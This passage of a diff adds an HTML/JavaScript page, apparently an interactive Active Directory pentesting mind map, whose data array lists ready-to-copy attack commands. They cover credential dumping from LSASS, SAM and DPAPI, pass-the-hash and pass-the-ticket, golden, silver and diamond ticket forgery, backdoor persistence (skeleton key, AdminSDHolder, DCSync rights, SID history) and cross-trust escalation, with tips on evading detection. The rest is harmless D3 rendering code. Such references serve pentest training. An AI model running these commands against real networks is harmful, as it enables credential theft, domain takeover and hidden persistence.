+pypykatz lsa minidump lsass.dmp`},
+    {name:"SAM + LSA",sev:"high",tool:"secretsdump",
+     cmd:`secretsdump.py -hashes :NTHASH -local-auth admin@TARGET
+reg save HKLM\\SAM C:\\Temp\\SAM
+reg save HKLM\\SYSTEM C:\\Temp\\SYS
+reg save HKLM\\SECURITY C:\\Temp\\SEC
+secretsdump.py -sam SAM -system SYS -security SEC LOCAL`},
+    {name:"GPP Passwords",sev:"high",tool:"nxc -M gpp_password",
+     cmd:`nxc smb DC_IP -u user -p 'pass' -M gpp_password
+Get-GPPPassword`,
+     tips:["MS published the AES key — any authenticated user can decrypt SYSVOL cPassword"]},
+    {name:"DPAPI Secrets",sev:"high",tool:"dpapi.py / SharpDPAPI",
+     cmd:`dpapi.py masterkey -file MASTERKEY -sid S-1-5-21-... -password PASS
+dpapi.py credential -file CREDFILE -key MASTERKEY
+SharpDPAPI.exe credentials /password:PASS`,
+     gotchas:["PSCredential decrypts ONLY in context of encrypting user (DPAPI-bound)"]},
+  ]},
+  {name:"Lateral Movement",color:"#00b8d4",children:[
+    {name:"Pass-the-Hash",sev:"crit",tool:"psexec / wmiexec / evil-winrm",
+     cmd:`psexec.py -hashes :NTHASH admin@TARGET
+wmiexec.py -hashes :NTHASH admin@TARGET
+evil-winrm -i TARGET -u admin -H NTHASH
+nxc smb SUBNET/24 -u admin -H NTHASH`},
+    {name:"Pass-the-Ticket",sev:"crit",tool:"impacket + Rubeus",
+     cmd:`export KRB5CCNAME=/path/ticket.ccache
+wmiexec.py -k -no-pass TARGET
+secretsdump.py -k -no-pass DC_FQDN
+
+Rubeus.exe ptt /ticket:BASE64_TICKET
+impacket-ticketConverter ticket.ccache ticket.kirbi`},
+    {name:"Overpass-the-Hash",sev:"high",tool:"getTGT.py / Rubeus",
+     cmd:`getTGT.py domain.local/user -hashes :NTHASH -dc-ip DC_IP
+export KRB5CCNAME=user.ccache
+wmiexec.py -k -no-pass TARGET
+
+Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
+Rubeus.exe asktgt /user:user /aes256:AESKEY /ptt`,
+     tips:["Use AES256 when available — RC4 TGT requests flagged by ATA/Defender"]},
+    {name:"WMI / WinRM / SMB",sev:"high",tool:"nxc / impacket",
+     cmd:`wmiexec.py admin:pass@TARGET
+evil-winrm -i TARGET -u admin -p 'pass'
+nxc winrm TARGET -u admin -H NTHASH -x 'whoami'
+smbexec.py admin:pass@TARGET
+xfreerdp /u:admin /pth:NTHASH /v:TARGET`},
+  ]},
+  {name:"Ticket Attacks",color:"#c792ea",children:[
+    {name:"Golden Ticket",sev:"crit",tool:"ticketer.py / Rubeus",
+     cmd:`secretsdump.py -hashes :NTHASH administrator@DC_IP | grep krbtgt
+
+ticketer.py \\
+  -nthash KRBTGT_HASH \\
+  -domain-sid S-1-5-21-... \\
+  -domain domain.local administrator
+
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass DC_FQDN
+
+Rubeus.exe golden /rc4:KRBTGT_HASH \\
+  /domain:domain.local /sid:DOMAIN_SID \\
+  /user:administrator /ptt`,
+     tips:["Valid 10 years. Survives all resets except krbtgt rotation (must rotate twice)."]},
+    {name:"Silver Ticket",sev:"high",tool:"ticketer.py",
+     cmd:`ticketer.py \\
+  -nthash MACHINE_NTHASH -domain-sid S-1-5-21-... \\
+  -domain domain.local \\
+  -spn cifs/TARGET.domain.local administrator
+
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass TARGET.domain.local`,
+     tips:["No DC contact = no DC logging. Service-specific only."]},
+    {name:"Diamond Ticket",sev:"high",tool:"Rubeus",
+     cmd:`Rubeus.exe diamond \\
+  /krbkey:KRBTGT_AES256 \\
+  /user:low_priv_user /password:'pass' \\
+  /enctype:aes /ticketuser:administrator \\
+  /dc:DC_FQDN \\
+  /createnetonly:C:\\Windows\\System32\\cmd.exe /show`,
+     tips:["Derived from real TGT — evades detection for impossible ticket lifetimes"]},
+    {name:"Shadow Creds",sev:"crit",tool:"certipy-ad shadow",
+     cmd:`certipy-ad shadow auto \\
+  -u attacker@domain -p 'pass' \\
+  -account targetuser -dc-ip DC_IP`},
+    {name:"AS-REP + PKINIT",sev:"high",tool:"Rubeus / PKINITtools",
+     cmd:`Rubeus.exe asktgt /user:user \\
+  /certificate:cert.pfx /ptt
+getTGT.py domain/user \\
+  -cert-pfx user.pfx -pfx-pass PASS`},
+  ]},
+  {name:"Persistence",color:"#8892a4",children:[
+    {name:"AdminSDHolder ACL",sev:"crit",tool:"PowerView",
+     cmd:`Add-DomainObjectAcl \\
+  -TargetIdentity \\
+    "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \\
+  -PrincipalIdentity backdoor_user \\
+  -Rights All
+
+Invoke-ADSDPropagation  # force immediate`,
+     tips:["Propagates to ALL protected groups every 60 min. Survives removal from DA."]},
+    {name:"DSRM Account",sev:"high",tool:"Mimikatz / secretsdump",
+     cmd:`lsadump::lsa /patch /name:dsrm
+
+Set-ItemProperty \\
+  "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" \\
+  -Name DsrmAdminLogonBehavior -Value 2
+
+secretsdump.py -hashes :DSRM_HASH \\
+  -local-auth administrator@DC_IP`},
+    {name:"SID History Inject",sev:"high",tool:"Mimikatz",
+     cmd:`privilege::debug
+sid::patch
+sid::add /sam:backdoor_user /new:DOMAIN_SID-500
+
+Get-DomainUser backdoor_user | Select sidhistory`,
+     tips:["User appears low-priv in UIs. SIDHistory grants DA via Kerberos PAC."]},
+    {name:"DCSync Rights Persist",sev:"crit",tool:"PowerView",
+     cmd:`Add-DomainObjectAcl \\
+  -TargetIdentity "DC=domain,DC=local" \\
+  -PrincipalIdentity backdoor_user \\
+  -Rights DCSync`},
+    {name:"Skeleton Key",sev:"crit",tool:"Mimikatz",
+     cmd:`privilege::debug
+misc::skeleton
+# 'mimikatz' now authenticates as ANY domain account`,
+     gotchas:["In-memory only — removed on DC reboot. Extremely loud if detected."]},
+  ]},
+  {name:"Cross-Trust",color:"#ff4d6a",children:[
+    {name:"Trust Enumeration",sev:"med",tool:"PowerView",
+     cmd:`Get-DomainTrust
+Get-ForestTrust
+Get-DomainTrustMapping
+(Get-DomainTrust).TrustAttributes
+# WITHIN_FOREST → SID filter OFF
+# TREAT_AS_EXTERNAL → SID filter ON`},
+    {name:"ExtraSids Child→Parent",sev:"crit",tool:"ticketer.py",
+     cmd:`secretsdump.py -hashes :CHILD_DA_HASH \\
+  administrator@CHILD_DC -just-dc-user krbtgt
+
+Get-DomainGroup -Domain parent.local \\
+  -Identity "Enterprise Admins" | Select objectsid
+
+ticketer.py \\
+  -nthash CHILD_KRBTGT \\
+  -domain-sid CHILD_SID \\
+  -domain child.domain.local \\
+  -extra-sid PARENT_EA_SID administrator
+
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass PARENT_DC_FQDN`,
+     gotchas:["Blocked by TREAT_AS_EXTERNAL. Only reliable on parent-child within same forest."]},
+    {name:"Trust Key Abuse",sev:"high",tool:"ticketer.py",
+     cmd:`secretsdump.py ... | grep -i "PARENT.LOCAL"
+ticketer.py -nthash TRUST_KEY \\
+  -domain child.local -domain-sid CHILD_SID \\
+  -extra-sid PARENT_EA_SID \\
+  -spn krbtgt/parent.local administrator`},
+    {name:"Foreign Group Membership",sev:"high",tool:"BloodHound / PowerView",
+     cmd:`Get-DomainForeignGroupMember
+Get-DomainForeignUser`,
+     tips:["Often finds forgotten service accounts with cross-domain privileged membership"]},
+    {name:"SID Filtering Bypass",sev:"high",tool:"manual",
+     cmd:`# Check filtering status
+(Get-DomainTrust).TrustAttributes | findstr TREAT_AS_EXTERNAL
+# WITHIN_FOREST = SID filter OFF (intra-forest default)
+# FOREST_TRANSITIVE + TREAT_AS_EXTERNAL = filter ON`},
+  ]},
+];
+
+// ════════════════════════════════════════════════════
+// BUILD CARDS
+// ════════════════════════════════════════════════════
+function buildCards(){
+  const body=document.getElementById('cards-body');
+  BRANCHES.forEach((branch,bi)=>{
+    const sec=document.createElement('section');
+    sec.className='branch-section';
+    sec.id='branch-'+slug(branch.name);
+    const hdr=document.createElement('div');
+    hdr.className='branch-header';
+    hdr.innerHTML=`<span class="bh-num">${String(bi+1).padStart(2,'0')}</span><span class="bh-dot" style="background:${branch.color}"></span>${esc(branch.name)}`;
+    sec.appendChild(hdr);
+    const grid=document.createElement('div');
+    grid.className='cards-grid';
+    branch.children.forEach(node=>{
+      const card=document.createElement('div');
+      card.className='ref-card';
+      card.id=slug(node.name);
+      const head=document.createElement('div');
+      head.className='card-head';
+      head.style.borderLeft=`3px solid ${branch.color}`;
+      head.innerHTML=`<div class="card-title">${esc(node.name)}</div><span class="sev-badge sev-${node.sev||'info'}">${SEV[node.sev]||'INFO'}</span>`;
+      card.appendChild(head);
+      const body2=document.createElement('div');
+      body2.className='card-body';
+      if(node.tool){
+        const t=document.createElement('div');t.className='card-tools';
+        t.innerHTML=`<span class="tools-lbl">TOOLS &nbsp;</span><span class="tools-val">${esc(node.tool)}</span>`;
+        body2.appendChild(t);
+      }
+      if(node.cmd){
+        const wrap=document.createElement('div');wrap.className='code-wrap';
+        const btn=document.createElement('button');btn.className='copy-btn';btn.textContent='COPY';
+        const pre=document.createElement('pre');pre.className='code-pre';pre.textContent=node.cmd;
+        btn.onclick=()=>{
+          navigator.clipboard.writeText(node.cmd).then(()=>{
+            btn.textContent='COPIED ✓';btn.classList.add('copied');
+            setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('copied');},1800);
+          });
+        };
+        wrap.appendChild(btn);wrap.appendChild(pre);body2.appendChild(wrap);
+      }
+      (node.tips||[]).forEach(t=>{const b=document.createElement('div');b.className='tip-box';b.textContent=t;body2.appendChild(b);});
+      (node.gotchas||[]).forEach(g=>{const b=document.createElement('div');b.className='gotcha-box';b.textContent=g;body2.appendChild(b);});
+      card.appendChild(body2);grid.appendChild(card);
+    });
+    sec.appendChild(grid);body.appendChild(sec);
+  });
+}
+buildCards();
+
+// ════════════════════════════════════════════════════
+// NAVIGATION
+// ════════════════════════════════════════════════════
+const cardsSection=document.getElementById('cards-section');
+const mapSection=document.getElementById('map-section');
+
+function jumpToCard(nodeData){
+  const id=slug(nodeData.name);
+  const el=document.getElementById(id);
+  if(!el)return;
+  // Scroll page to cards section
+  cardsSection.scrollIntoView({behavior:'smooth'});
+  // Then after brief delay scroll to the specific card
+  setTimeout(()=>{
+    el.scrollIntoView({behavior:'smooth',block:'center'});
+    el.classList.remove('flash');void el.offsetWidth;el.classList.add('flash');
+    setTimeout(()=>el.classList.remove('flash'),1400);
+    const lbl=document.getElementById('active-card-label');
+    if(lbl)lbl.textContent='→ '+nodeData.name;
+  },400);
+}
+
+document.getElementById('btn-cards').addEventListener('click',()=>{
+  cardsSection.scrollIntoView({behavior:'smooth'});
+});
+document.getElementById('scroll-arrow').addEventListener('click',()=>{
+  cardsSection.scrollIntoView({behavior:'smooth'});
+});
+document.getElementById('btn-back-map').addEventListener('click',()=>{
+  mapSection.scrollIntoView({behavior:'smooth'});
+});
+
+// ════════════════════════════════════════════════════
+// D3 MIND MAP
+// ════════════════════════════════════════════════════
+const mp=document.getElementById('map-section');
+const W=1800,H=1800,CX=900,CY=900;
+let RADIUS=700; // overridden in load from real viewport
+const svg=d3.select('#mindmap'); // no viewBox — coordinates = screen pixels
+
+// glow filter
+const defs=svg.append('defs');
+const gf=defs.append('filter').attr('id','glow')
+  .attr('x','-50%').attr('y','-50%').attr('width','200%').attr('height','200%');
+gf.append('feGaussianBlur').attr('stdDeviation','5').attr('result','blur');
+const fm=gf.append('feMerge');
+fm.append('feMergeNode').attr('in','blur');
+fm.append('feMergeNode').attr('in','SourceGraphic');
+
+// zoom — g must exist before handler fires
+const g=svg.append('g');
+const rg=g.append('g'); // translate set in load once viewport dimensions are real
+const zb=d3.zoom().scaleExtent([0.05,6]).on('zoom',e=>g.attr('transform',e.transform));
+svg.call(zb);
+
+// layout — size updated in load once RADIUS is known
+const cluster=d3.cluster()
+  .size([2*Math.PI,RADIUS])
+  .separation((a,b)=>(a.parent===b.parent?1:1.4)/a.depth);
+
+const treeData={name:'Active Directory\nPentesting',color:'#00d4aa',children:BRANCHES};
+
+function computeTree(d){
+  const root=d3.hierarchy(d);
+  root.each(n=>{
+    if(n.depth===0){n.data._color='#00d4aa';return;}
+    if(n.depth===1){n.data._color=n.data.color;return;}
+    let p=n;while(p.depth>1)p=p.parent;
+    n.data._color=p.data.color;
+  });
+  return cluster(root);
+}
+
+function bezierLink(d){
+  const r0=d.source.y,a0=d.source.x,r1=d.target.y,a1=d.target.x;
+  const x0=r0*Math.cos(a0-Math.PI/2),y0=r0*Math.sin(a0-Math.PI/2);
+  const x1=r1*Math.cos(a1-Math.PI/2),y1=r1*Math.sin(a1-Math.PI/2);
+  const mr=(r0+r1)*0.52;
+  return `M${x0},${y0} C${mr*Math.cos(a0-Math.PI/2)},${mr*Math.sin(a0-Math.PI/2)} ${mr*Math.cos(a1-Math.PI/2)},${mr*Math.sin(a1-Math.PI/2)} ${x1},${y1}`;
+}
+
+function nodeR(d){return d.depth===0?24:d.depth===1?11:5.5}
+let activeSlug=null;
+
+function render(){
+  rg.selectAll('*').remove();
+  const root=computeTree(treeData);
+
+  // links
+  rg.append('g').selectAll('path').data(root.links()).join('path')
+    .attr('class','link')
+    .attr('d',bezierLink)
+    .attr('stroke',d=>d.target.data._color||'#3a4555')
+    .attr('stroke-width',d=>d.target.depth===1?1.8:1.0);
+
+  // nodes
+  const ng=rg.append('g').selectAll('g').data(root.descendants()).join('g')
+    .attr('class','node')
+    .attr('transform',d=>{
+      const x=d.y*Math.cos(d.x-Math.PI/2),y=d.y*Math.sin(d.x-Math.PI/2);
+      return `translate(${x},${y})`;
+    })
+    .on('click',(e,d)=>{
+      e.stopPropagation();
+      if(d.depth===0)return;
+      if(d.depth===1){toggleNode(d);return;}
+      jumpToCard(d.data);
+      activeSlug=slug(d.data.name);
+      render();
+    })
+    .on('mouseenter',(e,d)=>showTip(e,d.data.name,d.data._color))
+    .on('mousemove',e=>moveTip(e))
+    .on('mouseleave',()=>hideTip());
+
+  // circles
+  ng.append('circle')
+    .attr('r',nodeR)
+    .attr('fill',d=>d.depth===0?'#0a0c0f':d.data._color+'1a')
+    .attr('stroke',d=>d.data._color||'#3a4555')
+    .attr('stroke-width',d=>{
+      if(d.depth===0)return 2.5;
+      if(slug(d.data.name)===activeSlug)return 3.5;
+      return d.depth===1?2:1.5;
+    })
+    .attr('filter',d=>
+      d.depth===0||slug(d.data.name)===activeSlug?'url(#glow)':null
+    );
+
+  // labels
+  ng.append('text')
+    .attr('dy','0.31em')
+    .attr('x',d=>{
+      if(d.depth===0)return 0;
+      const ang=d.x*180/Math.PI;
+      return(nodeR(d)+6)*(ang<180?1:-1);
+    })
+    .attr('text-anchor',d=>{
+      if(d.depth===0)return'middle';
+      return(d.x*180/Math.PI)<180?'start':'end';
+    })
+    .attr('fill',d=>d.depth===0?'#fff':d.data._color)
+    .attr('font-size',d=>d.depth===0?'13px':d.depth===1?'12px':'10px')
+    .attr('font-weight',d=>d.depth<=1?'700':'400')
+    .each(function(d){
+      const el=d3.select(this);
+      if(d.depth===0){
+        const lines=d.data.name.split('\n');el.text(null);
+        lines.forEach((l,i)=>el.append('tspan')
+          .attr('x',0).attr('dy',i===0?`${-(lines.length-1)*8}px`:'16px')
+          .attr('text-anchor','middle').text(l));
+      } else {
+        const n=d.data.name;
+        el.text(n.length>24?n.slice(0,22)+'…':n);
+      }
+    });
+
+  document.getElementById('node-count').textContent=`${root.descendants().length} nodes`;
+  buildLegend();
+}
+
+function toggleNode(d){
+  if(d.children){d._children=d.children;d.children=null;}
+  else if(d._children){d.children=d._children;d._children=null;}
+  render();
+}
+
+// ── LEGEND ──
+function buildLegend(){
+  const leg=document.getElementById('legend');
+  leg.innerHTML='<div class="lg-title">Categories</div>';
+  BRANCHES.forEach(b=>{
+    const row=document.createElement('div');row.className='lg-row';
+    row.innerHTML=`<span class="lg-dot" style="background:${b.color}"></span>${esc(b.name)}`;
+    row.addEventListener('mouseenter',()=>{
+      rg.selectAll('.node').classed('dimmed',d=>{
+        if(d.depth===0)return false;
+        let p=d;while(p.depth>1)p=p.parent;
+        return p.data.name!==b.name;
+      });
+      rg.selectAll('.link').classed('dimmed',d=>{
+        let p=d.target;while(p.depth>1)p=p.parent;
+        return p.data.name!==b.name;
+      });
+    });
+    row.addEventListener('mouseleave',()=>{
+      rg.selectAll('.node').classed('dimmed',false);
+      rg.selectAll('.link').classed('dimmed',false);
+    });
+    row.addEventListener('click',()=>{
+      const el=document.getElementById('branch-'+slug(b.name));
+      if(el){cardsSection.scrollIntoView({behavior:'smooth'});setTimeout(()=>el.scrollIntoView({behavior:'smooth',block:'start'}),400);}
+    });
+    leg.appendChild(row);
+  });
+}
+
+// ── CONTROLS ──
+document.getElementById('btn-expand').addEventListener('click',()=>{
+  function exp(d){if(d._children){d.children=d._children;d._children=null;}if(d.children)d.children.forEach(exp);}
+  exp(treeData);render();
+});
+document.getElementById('btn-collapse').addEventListener('click',()=>{
+  (treeData.children||[]).forEach(b=>{if(b.children){b._children=b.children;b.children=null;}});render();
+});
+
+// ── MINI TOOLTIP ──
+const mt=document.getElementById('mini-tip');
+function showTip(e,name,color){mt.textContent=name;mt.style.color=color||'#c8d4e0';mt.classList.add('show');moveTip(e);}
+function moveTip(e){mt.style.left=(e.clientX+12)+'px';mt.style.top=(e.clientY+12)+'px';}
+function hideTip(){mt.classList.remove('show');}
+
+// ── SEARCH ──
+document.getElementById('search').addEventListener('input',function(){
+  const q=this.value.toLowerCase().trim();
+  const mc=document.getElementById('match-count');
+  if(!q){rg.selectAll('.node').classed('dimmed',false);rg.selectAll('.link').classed('dimmed',false);mc.textContent='';return;}
+  const allD=rg.selectAll('.node').data();
+  const hits=new Set();
+  allD.forEach(d=>{
+    if([(d.data.name||''),(d.data.tool||''),(d.data.cmd||'')].join(' ').toLowerCase().includes(q)){
+      hits.add(d);let p=d;while(p.parent){hits.add(p.parent);p=p.parent;}
+    }
+  });
+  rg.selectAll('.node').classed('dimmed',d=>!hits.has(d));
+  rg.selectAll('.link').classed('dimmed',d=>!hits.has(d.target));
+  mc.textContent=`${allD.filter(d=>(d.data.name||'').toLowerCase().includes(q)).length} hits`;
+});
+
+// ── INIT — after layout paints so clientWidth/Height are real ──
+window.addEventListener('load',()=>{
+  const vw=mp.clientWidth||window.innerWidth;
+  const vh=mp.clientHeight||window.innerHeight;
+
+  // RADIUS fills ~43% of the shorter viewport dimension
+  RADIUS=Math.min(vw,vh)*0.43;
+  cluster.size([2*Math.PI,RADIUS]);
+
+  // Center the radial graph in the viewport
+  rg.attr('transform',`translate(${vw/2},${vh/2})`);
+
+  // Identity zoom — rg centering handles initial positioning
+  svg.call(zb.transform,d3.zoomIdentity);
+
+  document.getElementById('btn-reset').addEventListener('click',()=>{
+    svg.transition().duration(500).call(zb.transform,d3.zoomIdentity);
+  });
+
+  render();
+});
+</script>
+</body>
+</html>
